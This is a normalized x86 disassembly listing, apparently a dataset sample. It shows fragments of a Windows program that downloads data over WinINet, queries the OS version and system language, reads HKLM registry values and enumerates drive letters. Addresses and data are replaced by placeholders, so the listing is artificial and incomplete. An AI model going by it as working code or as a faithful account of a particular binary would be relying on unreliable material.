jmp r-xdata
mov [ ebp - 0x43c ] 0x0
mov edx [ ebp - 0x420 ]
cmp edx [ ebp - 0x41c ]
jne r-xdata
mov [ ebp - 0x416 ] 0x0
mov edx [ ebp - 0x420 ]
cmp edx [ ebp - 0x41c ]
jne r-xdata
push r--data
mov ecx [ ebp + 0xc ]
call sub_401870
push eax
call sub_424744
add esp 0x8
mov [ ebp - 0x434 ] eax
cmp [ ebp - 0x434 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x43c ] 0x1
jmp r-xdata
mov [ ebp - 0x416 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x424 ]
push edx
call [ InternetCloseHandle@IAT ]
mov [ ebp - 0x424 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov al [ ebp - 0x43c ]
movzx eax [ ebp - 0x416 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x14 ]
mov eax [ edx + 0x8 ]
call eax
cmp [ ebp - 0x414 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x14 ]
mov eax [ edx ]
call eax
mov ecx [ ebp - 0x434 ]
push ecx
call sub_4232da
add esp 0x4
mov [ ebp - 0x415 ] 0x1
lea ecx [ ebp - 0x414 ]
push ecx
push 0x3ff
lea edx [ ebp - 0x410 ]
push edx
mov eax [ ebp - 0x424 ]
push eax
call [ InternetReadFile@IAT ]
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x414 ]
mov [ ebp - 0x41c ] ecx
mov edx [ ebp - 0x434 ]
push edx
mov eax [ ebp - 0x414 ]
push eax
push 0x1
lea ecx [ ebp - 0x410 ]
push ecx
call sub_422d75
add esp 0x10
cmp [ ebp + 0x14 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x420 ]
push edx
mov eax [ ebp - 0x41c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
sub_41bf90
push ebp
mov ebp esp
push 0xffffffff
push sub_43bdf8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x18
call sub_40ffa0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41bff0
push ebp
mov ebp esp
sub esp 0xc
call [ GetSystemDefaultLangID@IAT ]
movzx eax ax
mov [ ebp - 0xc ] eax
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bde0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1d
jae r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
imul edx edx 0x54
mov eax [ edx + rw-data ]
cmp eax [ ebp - 0xc ]
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x54
add edx rw-data
push edx
mov ecx [ ebp + 0x8 ]
call sub_40bde0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x54
add eax rw-data
push eax
mov ecx [ ebp + 0x8 ]
call sub_40bde0
jmp r-xdata
sub_41c0e0
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] 0x0
xor eax eax
mov [ ebp - 0x20c ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x20a ]
push ecx
call sub_427900
add esp 0xc
push 0x104
lea edx [ ebp - 0x20c ]
push edx
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov ecx [ ebp - 0x210 ]
or ecx 0x1
mov [ ebp - 0x210 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41c170
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
test ecx ecx
jne r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push edx
call [ GetFileAttributesW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov al 0x1
xor al al
jmp r-xdata
sub_41c1b0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bf0b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x228 ] ecx
xor eax eax
mov [ ebp - 0x218 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x216 ]
push ecx
call sub_427900
add esp 0xc
push 0x104
lea edx [ ebp - 0x218 ]
push edx
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
push r--data
lea eax [ ebp - 0x218 ]
push eax
call [ PathAppendW@IAT ]
lea ecx [ ebp - 0x218 ]
push ecx
lea ecx [ ebp - 0x240 ]
call sub_40bd80
mov [ ebp - 0x224 ] eax
mov edx [ ebp - 0x224 ]
mov [ ebp - 0x21c ] edx
mov [ ebp - 0x4 ] 0x0
push r--data
mov eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x258 ]
push ecx
call sub_41b4f0
add esp 0xc
mov [ ebp - 0x220 ] eax
mov edx [ ebp - 0x220 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_410d50
lea ecx [ ebp - 0x258 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x240 ]
call sub_40bdc0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41c2c0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x418 ] 0x0
push 0x208
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call sub_427900
add esp 0xc
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
push 0x0
lea edx [ ebp - 0x414 ]
push edx
call sub_427900
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push 0x0
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call [ GetTempFileNameW@IAT ]
lea edx [ ebp - 0x414 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x418 ]
or eax 0x1
mov [ ebp - 0x418 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41c380
push ebp
mov ebp esp
push 0xffffffff
push sub_43c272
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x120 ] ecx
mov ecx 0x13
mov esi r--data
lea edi [ ebp - 0x90 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x32
push 0x0
lea eax [ ebp - 0x42 ]
push eax
call sub_427900
add esp 0xc
push 0x40
lea ecx [ ebp - 0x90 ]
push ecx
call sub_4202c0
add esp 0x8
mov [ ebp - 0x119 ] al
push r--data
lea ecx [ ebp - 0xf8 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x0
push 0x1
lea edx [ ebp - 0xf8 ]
push edx
call sub_41bff0
add esp 0x8
mov [ ebp - 0x118 ] 0x0
jmp r-xdata
cmp [ ebp - 0x118 ] 0x26
jge r-xdata
push r--data
lea ecx [ ebp - 0xe0 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x110 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x2
push r--data
lea ecx [ ebp - 0xc8 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x3
push r--data
lea ecx [ ebp - 0xb0 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x4
lea edx [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x110 ]
push ecx
lea edx [ ebp - 0xe0 ]
push edx
mov ecx [ ebp - 0x120 ]
call sub_41c680
push 0x1
lea ecx [ ebp - 0x98 ]
call sub_41c0c0
push 0xf003f
push r--data
push 0x80000002
lea ecx [ ebp - 0x98 ]
call sub_41ee80
mov [ ebp - 0x4 ] 0x5
push r--data
lea eax [ ebp - 0xe0 ]
push eax
call sub_41e9c0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x118 ]
movzx edx [ ebp + ecx * 2 - 0x90 ]
cmp edx 0x41
jl r-xdata
mov ecx [ ebp + 0xc ]
call sub_40be90
push eax
push r--data
lea ecx [ ebp - 0x98 ]
call sub_41f0c0
push r--data
lea edx [ ebp - 0xc8 ]
push edx
call sub_41e9c0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
push r--data
lea ecx [ ebp - 0x98 ]
call sub_41f0c0
jmp r-xdata
mov eax [ ebp - 0x118 ]
movzx ecx [ ebp + eax * 2 - 0x90 ]
cmp ecx 0x5a
jg r-xdata
mov ecx [ ebp + 0x10 ]
call sub_40be90
push eax
push r--data
lea ecx [ ebp - 0x98 ]
call sub_41f0c0
push r--data
lea edx [ ebp - 0xb0 ]
push edx
call sub_41e9c0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
lea ecx [ ebp - 0x90 ]
push ecx
push r--data
lea ecx [ ebp - 0x98 ]
call sub_41f0c0
mov eax [ ebp - 0x118 ]
add eax 0x1
mov [ ebp - 0x118 ] eax
mov edx [ ebp - 0x118 ]
movzx eax [ ebp + edx * 2 - 0x90 ]
add eax 0x20
mov ecx [ ebp - 0x118 ]
mov [ ebp + ecx * 2 - 0x90 ] ax
mov [ ebp - 0x111 ] 0x1
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x98 ]
call sub_41c0a0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0xb0 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xc8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x110 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xe0 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xf8 ]
call sub_40bdc0
mov al [ ebp - 0x111 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp + 0x14 ]
call sub_40be90
push eax
push r--data
lea ecx [ ebp - 0x98 ]
call sub_41f0c0
sub_41c680
push ebp
mov ebp esp
push 0xffffffff
push sub_43c14b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x604 ] ecx
push 0x1
lea ecx [ ebp - 0x5dc ]
call sub_41c0c0
push 0xf003f
push r--data
push 0x80000002
lea ecx [ ebp - 0x5dc ]
call sub_41ee80
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov [ ebp - 0x5d0 ] ax
push 0x40e
push 0x0
lea ecx [ ebp - 0x5ce ]
push ecx
call sub_427900
add esp 0xc
xor edx edx
mov [ ebp - 0xc0 ] dx
push 0x5e
push 0x0
lea eax [ ebp - 0xbe ]
push eax
call sub_427900
add esp 0xc
xor ecx ecx
mov [ ebp - 0x1c0 ] cx
push 0xfe
push 0x0
lea edx [ ebp - 0x1be ]
push edx
call sub_427900
add esp 0xc
xor eax eax
mov [ ebp - 0x600 ] ax
xor ecx ecx
mov [ ebp - 0x5fe ] ecx
mov [ ebp - 0x5fa ] ecx
mov [ ebp - 0x5f6 ] ecx
mov [ ebp - 0x5f2 ] ecx
mov [ ebp - 0x5ee ] ecx
mov [ ebp - 0x5ea ] ecx
mov [ ebp - 0x5e6 ] ecx
mov [ ebp - 0x5e2 ] cx
xor edx edx
mov [ ebp - 0x60 ] dx
push 0x4e
push 0x0
lea eax [ ebp - 0x5e ]
push eax
call sub_427900
add esp 0xc
mov [ ebp - 0x5d4 ] 0x208
push 0x0
lea ecx [ ebp - 0x5d4 ]
push ecx
lea edx [ ebp - 0x5d0 ]
push edx
push r--data
lea ecx [ ebp - 0x5dc ]
call sub_41f000
mov [ ebp - 0x5d4 ] 0x30
push 0x0
lea eax [ ebp - 0x5d4 ]
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
push r--data
lea ecx [ ebp - 0x5dc ]
call sub_41f000
mov [ ebp - 0x5d4 ] 0x80
push 0x0
lea edx [ ebp - 0x5d4 ]
push edx
lea eax [ ebp - 0x1c0 ]
push eax
push r--data
lea ecx [ ebp - 0x5dc ]
call sub_41f000
mov [ ebp - 0x5d4 ] 0x28
push 0x0
lea ecx [ ebp - 0x5d4 ]
push ecx
lea edx [ ebp - 0x60 ]
push edx
push r--data
lea ecx [ ebp - 0x5dc ]
call sub_41f000
lea eax [ ebp - 0x5d0 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40bde0
lea ecx [ ebp - 0xc0 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_40bde0
lea edx [ ebp - 0x1c0 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_40bde0
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp + 0x14 ]
call sub_40bde0
push r--data
mov ecx [ ebp + 0x14 ]
push ecx
call sub_41e9c0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov [ ebp - 0x5dd ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5dc ]
call sub_41c0a0
mov al [ ebp - 0x5dd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
push r--data
mov ecx [ ebp + 0x14 ]
call sub_40bde0
sub_41c8d0
push ebp
mov ebp esp
push 0xffffffff
push sub_43c207
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6dc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x628 ] ecx
mov [ ebp - 0x5c0 ] 0x0
push 0x1
lea ecx [ ebp - 0x5bc ]
call sub_41c0c0
push 0xf003f
push r--data
push 0x80000002
lea ecx [ ebp - 0x5bc ]
call sub_41ee80
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov [ ebp - 0x5b0 ] ax
push 0x40e
push 0x0
lea ecx [ ebp - 0x5ae ]
push ecx
call sub_427900
add esp 0xc
xor edx edx
mov [ ebp - 0xa0 ] dx
push 0x5e
push 0x0
lea eax [ ebp - 0x9e ]
push eax
call sub_427900
add esp 0xc
xor ecx ecx
mov [ ebp - 0x1a0 ] cx
push 0xfe
push 0x0
lea edx [ ebp - 0x19e ]
push edx
call sub_427900
add esp 0xc
xor eax eax
mov [ ebp - 0x624 ] ax
xor ecx ecx
mov [ ebp - 0x622 ] ecx
mov [ ebp - 0x61e ] ecx
mov [ ebp - 0x61a ] ecx
mov [ ebp - 0x616 ] ecx
mov [ ebp - 0x612 ] ecx
mov [ ebp - 0x60e ] ecx
mov [ ebp - 0x60a ] ecx
mov [ ebp - 0x606 ] cx
xor edx edx
mov [ ebp - 0x40 ] dx
push 0x2e
push 0x0
lea eax [ ebp - 0x3e ]
push eax
call sub_427900
add esp 0xc
mov [ ebp - 0x5b4 ] 0x208
push 0x0
lea ecx [ ebp - 0x5b4 ]
push ecx
lea edx [ ebp - 0x5b0 ]
push edx
push r--data
lea ecx [ ebp - 0x5bc ]
call sub_41f000
mov [ ebp - 0x5b4 ] 0x30
push 0x0
lea eax [ ebp - 0x5b4 ]
push eax
lea ecx [ ebp - 0xa0 ]
push ecx
push r--data
lea ecx [ ebp - 0x5bc ]
call sub_41f000
mov [ ebp - 0x5b4 ] 0x80
push 0x0
lea edx [ ebp - 0x5b4 ]
push edx
lea eax [ ebp - 0x1a0 ]
push eax
push r--data
lea ecx [ ebp - 0x5bc ]
call sub_41f000
mov [ ebp - 0x5b4 ] 0x18
push 0x0
lea ecx [ ebp - 0x5b4 ]
push ecx
lea edx [ ebp - 0x40 ]
push edx
push r--data
lea ecx [ ebp - 0x5bc ]
call sub_41f000
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x6a0 ]
call sub_40bd80
mov [ ebp - 0x5f8 ] eax
mov ecx [ ebp - 0x5f8 ]
mov [ ebp - 0x5e8 ] ecx
mov [ ebp - 0x4 ] 0x1
push r--data
mov edx [ ebp - 0x5e8 ]
push edx
call sub_41e9c0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
lea ecx [ ebp - 0xa0 ]
push ecx
lea ecx [ ebp - 0x640 ]
call sub_40bd80
mov [ ebp - 0x604 ] eax
mov edx [ ebp - 0x5c0 ]
or edx 0x1
mov [ ebp - 0x5c0 ] edx
mov eax [ ebp - 0x604 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410d50
mov [ ebp - 0x600 ] eax
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bde0
mov [ ebp - 0x600 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x6a0 ]
call sub_40bdc0
lea edx [ ebp - 0x40 ]
push edx
lea ecx [ ebp - 0x688 ]
call sub_40bd80
mov [ ebp - 0x5f4 ] eax
mov eax [ ebp - 0x5f4 ]
mov [ ebp - 0x5fc ] eax
mov [ ebp - 0x4 ] 0x2
push r--data
mov ecx [ ebp - 0x5fc ]
push ecx
call sub_41e9c0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
and [ ebp - 0x5c0 ] 0xfffffffe
lea ecx [ ebp - 0x640 ]
call sub_40bdc0
mov ecx [ ebp - 0x5c0 ]
and ecx 0x1
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x658 ]
call sub_40bd80
mov [ ebp - 0x5f0 ] eax
mov ecx [ ebp - 0x5c0 ]
or ecx 0x2
mov [ ebp - 0x5c0 ] ecx
mov edx [ ebp - 0x5f0 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_410d50
mov [ ebp - 0x5d8 ] eax
push r--data
mov ecx [ ebp + 0x10 ]
call sub_40bde0
mov [ ebp - 0x5d8 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x688 ]
call sub_40bdc0
lea ecx [ ebp - 0x5b0 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
call sub_40bd80
mov [ ebp - 0x5dc ] eax
mov edx [ ebp - 0x5dc ]
push edx
mov ecx [ ebp + 0xc ]
call sub_410d50
lea ecx [ ebp - 0x6b8 ]
call sub_40bdc0
lea eax [ ebp - 0x5b0 ]
push eax
lea ecx [ ebp - 0x6d0 ]
call sub_40bd80
mov [ ebp - 0x5e0 ] eax
mov ecx [ ebp - 0x5e0 ]
mov [ ebp - 0x5e4 ] ecx
mov [ ebp - 0x4 ] 0x3
mov edx [ ebp - 0x5c0 ]
or edx 0x4
mov [ ebp - 0x5c0 ] edx
push r--data
mov eax [ ebp - 0x5e4 ]
push eax
call sub_41e9c0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
and [ ebp - 0x5c0 ] 0xfffffffd
lea ecx [ ebp - 0x658 ]
call sub_40bdc0
mov eax [ ebp - 0x5c0 ]
and eax 0x2
je r-xdata
mov [ ebp - 0x5c8 ] 0x0
lea edx [ ebp - 0xa0 ]
push edx
lea ecx [ ebp - 0x670 ]
call sub_40bd80
mov [ ebp - 0x5cc ] eax
mov eax [ ebp - 0x5cc ]
mov [ ebp - 0x5ec ] eax
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x5c0 ]
or ecx 0x8
mov [ ebp - 0x5c0 ] ecx
push r--data
mov edx [ ebp - 0x5ec ]
push edx
call sub_41e9c0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov edx [ ebp - 0x5c0 ]
and edx 0x8
je r-xdata
and [ ebp - 0x5c0 ] 0xffffffef
lea ecx [ ebp - 0x6e8 ]
call sub_40bdc0
lea ecx [ ebp - 0x1a0 ]
push ecx
lea ecx [ ebp - 0x6e8 ]
call sub_40bd80
mov [ ebp - 0x5d0 ] eax
mov edx [ ebp - 0x5d0 ]
mov [ ebp - 0x5d4 ] edx
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x5c0 ]
or eax 0x10
mov [ ebp - 0x5c0 ] eax
push r--data
mov ecx [ ebp - 0x5d4 ]
push ecx
call sub_41e9c0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x5c0 ]
and eax 0x4
je r-xdata
and [ ebp - 0x5c0 ] 0xfffffff7
lea ecx [ ebp - 0x670 ]
call sub_40bdc0
mov [ ebp - 0x5c8 ] 0x1
jmp r-xdata
movzx ecx [ ebp - 0x5c2 ]
test ecx ecx
je r-xdata
and [ ebp - 0x5c0 ] 0xfffffffb
lea ecx [ ebp - 0x6d0 ]
call sub_40bdc0
mov al [ ebp - 0x5c8 ]
mov [ ebp - 0x5c2 ] al
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x5c0 ]
and ecx 0x10
je r-xdata
mov [ ebp - 0x5c1 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5bc ]
call sub_41c0a0
mov al [ ebp - 0x5c1 ]
mov [ ebp - 0x5c3 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5bc ]
call sub_41c0a0
mov al [ ebp - 0x5c3 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_41ce30
push ebp
mov ebp esp
sub esp 0x24
push esi
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_401890
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
imul eax eax 0x64
imul eax eax 0x64
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x64
add eax [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x20 ]
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_41a320
movzx eax [ eax ]
cmp eax 0x30
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a320
movzx ecx [ eax ]
cmp ecx 0x30
jl r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_41a320
movzx edx [ eax ]
cmp edx 0x39
jg r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_41a320
movzx eax [ eax ]
cmp eax 0x39
jg r-xdata
mov esi [ ebp - 0x8 ]
imul esi esi 0xa
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a320
movzx ecx [ eax ]
lea edx [ esi + ecx - 0x30 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0xc ] 0x2
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
cmp [ ebp - 0x4 ] ecx
jne r-xdata
cmp [ ebp - 0xc ] 0x3
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_41cf60
push ebp
mov ebp esp
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x128 ] ecx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x120 ] 0x11c
lea eax [ ebp - 0x120 ]
push eax
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x110 ] 0x2
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov ecx [ ebp - 0x124 ]
or ecx 0x1
mov [ ebp - 0x124 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x124 ]
or eax 0x1
mov [ ebp - 0x124 ] eax
mov eax [ ebp + 0x8 ]
cmp [ ebp - 0x11c ] 0x4
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x11c ] 0x5
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov edx [ ebp - 0x124 ]
or edx 0x1
mov [ ebp - 0x124 ] edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x11c ] 0x5
jne r-xdata
cmp [ ebp - 0x118 ] 0x0
jne r-xdata
cmp [ ebp - 0x11c ] 0x5
jne r-xdata
cmp [ ebp - 0x118 ] 0x1
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x124 ]
or eax 0x1
mov [ ebp - 0x124 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x11c ] 0x6
jne r-xdata
cmp [ ebp - 0x118 ] 0x2
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov ecx [ ebp - 0x124 ]
or ecx 0x1
mov [ ebp - 0x124 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x11c ] 0x7
jb r-xdata
cmp [ ebp - 0x118 ] 0x0
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov edx [ ebp - 0x124 ]
or edx 0x1
mov [ ebp - 0x124 ] edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov edx [ ebp - 0x124 ]
or edx 0x1
mov [ ebp - 0x124 ] edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x118 ] 0x1
jne r-xdata
movzx eax [ ebp - 0x6 ]
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x118 ] 0x2
jne r-xdata
movzx eax [ ebp - 0x6 ]
cmp eax 0x1
jne r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov edx [ ebp - 0x124 ]
or edx 0x1
mov [ ebp - 0x124 ] edx
mov eax [ ebp + 0x8 ]
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov ecx [ ebp - 0x124 ]
or ecx 0x1
mov [ ebp - 0x124 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x118 ] 0x3
jb r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x124 ]
or eax 0x1
mov [ ebp - 0x124 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov edx [ ebp - 0x124 ]
or edx 0x1
